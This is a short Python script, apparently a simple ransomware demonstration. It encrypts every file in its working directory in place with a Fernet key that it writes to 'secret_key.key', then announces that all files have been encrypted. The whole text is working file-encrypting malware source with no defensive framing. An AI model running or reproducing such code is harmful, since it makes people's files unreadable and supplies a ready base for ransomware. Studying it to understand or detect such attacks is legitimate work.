import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypted.py" or file == "secret_key.key" or file == "decrypted.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Encrypted files: ", files)

key = Fernet.generate_key()
with open("secret_key.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as file_encrypted:
        content = file_encrypted.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, "wb") as file_encrypted:
        file_encrypted.write(content_encrypt)

print("All your files has been encrypted")
